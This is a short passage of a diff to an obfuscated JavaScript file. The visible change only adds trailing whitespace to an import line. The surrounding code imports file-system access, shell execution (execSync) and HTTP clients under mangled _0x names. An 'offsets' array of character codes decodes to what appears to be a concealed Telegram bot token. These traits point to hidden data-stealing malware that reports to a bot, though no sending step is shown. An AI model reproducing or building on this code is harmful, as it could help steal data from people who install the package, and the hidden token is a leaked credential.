@@ -2,7 +2,7 @@ import _0x120b6d from 'fs';
 import _0x19ec8d from 'circular-json';
 import { execSync } from 'child_process';
 import { v4 as _0x42f7fe } from 'uuid';
-import _0x4c9f44 from 'axios';
+import _0x4c9f44 from 'axios'; 
 import { exit } from 'process';
 import _0x4c2ef8 from 'https';
 const offsets = [55, 50, 49, 50, 49, 52, 56, 56, 57, 48, 58, 65, 65, 71, 103, 74, 65, 69, 76, 66, 115, 75, 69, 81, 76, 66, 87, 110, 121, 102, 74, 65, 88, 71, 115, 95, 49, 119, 45, 119, 105, 122, 70, 73, 115, 65];
